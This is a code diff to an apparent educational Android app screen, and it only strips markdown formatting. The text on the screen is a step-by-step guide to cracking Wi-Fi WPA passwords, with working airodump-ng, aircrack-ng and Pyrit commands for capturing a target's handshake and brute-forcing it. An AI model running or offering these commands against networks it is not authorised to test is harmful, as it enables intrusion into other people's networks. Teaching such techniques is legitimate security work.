@@ -46,9 +46,9 @@ fun Project1Screen(navController: NavController) {
         )
         Text(
             text = """
-                - **Aircrack-ng**: A powerful tool for cracking WEP and WPA keys.
-                - **Scapy**: A Python library for network packet manipulation.
-                - **Pyrit**: A tool for performing brute-force attacks on WPA.
+                - Aircrack-ng: A powerful tool for cracking WEP and WPA keys.
+                - Scapy: A Python library for network packet manipulation.
+                - Pyrit: A tool for performing brute-force attacks on WPA.
             """.trimIndent(),
             modifier = Modifier.padding(vertical = 8.dp)
         )
@@ -62,7 +62,7 @@ fun Project1Screen(navController: NavController) {
         )
         Text(
             text = """
-                1. **Scanning Wi-Fi Networks**:
+                1.Scanning Wi-Fi Networks:
                    Use Python's Scapy library to scan for available Wi-Fi networks.
                    ```python
                    from scapy.all import *
@@ -74,19 +74,19 @@ fun Project1Screen(navController: NavController) {
                    scan_wifi("wlan0")
                    ```
 
-                2. **Capturing the Handshake**:
+                2. Capturing the Handshake:
                    Capture the WPA handshake using airodump-ng.
                    ```bash
                    sudo airodump-ng wlan0 --bssid [Target_BSSID] --channel [Target_Channel] --write handshake
                    ```
 
-                3. **Cracking the Password**:
+                3. Cracking the Password:
                    Use Aircrack-ng and a wordlist to attempt to crack the Wi-Fi password.
                    ```bash
                    sudo aircrack-ng handshake.cap -w /path/to/wordlist.txt
                    ```
 
-                4. **Optional: Pyrit for GPU Cracking**:
+                4. Optional: Pyrit for GPU Cracking:
                    Use Pyrit to crack WPA/WPA2 keys faster using GPU acceleration.
                    ```bash
                    sudo pyrit -r handshake.cap -i /path/to/wordlist.txt attack_passthrough
